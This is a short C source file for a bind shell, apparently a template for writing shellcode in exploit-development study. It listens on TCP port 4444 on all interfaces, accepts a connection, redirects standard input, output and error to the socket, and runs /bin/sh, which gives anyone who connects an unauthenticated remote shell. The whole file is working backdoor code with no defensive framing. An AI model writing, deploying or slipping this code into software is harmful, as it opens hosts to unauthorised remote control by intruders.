#include <stdio.h>
#include <netinet/in.h>

// Change the correct port here
#define PORT 4444

int main(int argc, char **argv)
{	
	// sys_sockeet()	
	int bind_socket = socket(AF_INET, SOCK_STREAM, 0);
	
	// sys_setsocopt()
	int option = 1;
	setsockopt(bind_socket, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option));
	
	// sys_bind()
	struct sockaddr_in address;
	address.sin_addr.s_addr = INADDR_ANY;
	address.sin_port = htons(PORT);
	address.sin_family = AF_INET;
	bind(bind_socket,(struct sockaddr *)&address, sizeof(address));
	
	// sys_listen()
	listen(bind_socket,0);
	
	// sys_accept()
	int sock = accept(bind_socket,NULL,NULL);
	
	// sys_dup2()
	dup2(sock,2);	// STDERR
	dup2(sock,1);	// STDOUT
	dup2(sock,0);	// STDIN
	
	// sys_execve()
	execve("/bin/sh",NULL,NULL);
	
	return 0;
}
